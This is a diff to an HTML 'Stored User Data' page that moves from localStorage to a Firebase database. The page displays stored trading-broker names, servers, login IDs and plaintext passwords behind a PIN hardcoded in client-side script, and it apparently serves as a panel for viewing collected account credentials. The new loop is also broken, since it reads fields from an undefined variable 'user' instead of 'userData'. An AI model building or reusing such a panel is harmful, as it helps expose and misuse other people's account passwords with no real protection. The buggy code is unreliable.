@@ -6,6 +6,8 @@
     <title>Stored User Data</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="icon" type="image/png" href="https://www.pngall.com/wp-content/uploads/13/Bulls-Logo-PNG-File.png">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body>
     <div class="data-container" id="dataContainer" style="display:none;">
@@ -16,6 +18,18 @@
     </div>
 
     <script>
+        // Initialize Firebase (replace with your own config)
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+
         // Define the correct PIN
         const correctPin = "20031020";
 
@@ -33,13 +47,20 @@
         }
 
         function loadData() {
-            const storedData = JSON.parse(localStorage.getItem("userData")) || [];
             const userDataList = document.getElementById("userDataList");
-
-            storedData.forEach(user => {
-                const listItem = document.createElement("li");
-                listItem.textContent = "Broker: " + user.broker + ", Server: " + user.brokerServer + ", Login ID: " + user.loginID + ", Password: " + user.password;
-                userDataList.appendChild(listItem);
+            
+            firebase.database().ref('users').on('value', (snapshot) => {
+                userDataList.innerHTML = ''; // Clear existing data
+                snapshot.forEach((childSnapshot) => {
+                    const userData = childSnapshot.val();
+                    const listItem = document.createElement("li");
+                    const date = new Date(userData.timestamp);
+                    listItem.textContent = "Broker: " + user.broker + ", Server: " + user.brokerServer + ", Login ID: " + user.loginID + ", Password: " + user.password;
+                    userDataList.appendChild(listItem);
+                });
+            }, (error) => {
+                console.error("Error reading from Firebase Database", error);
+                alert("An error occurred while loading data. Please try again.");
             });
         }
     </script>
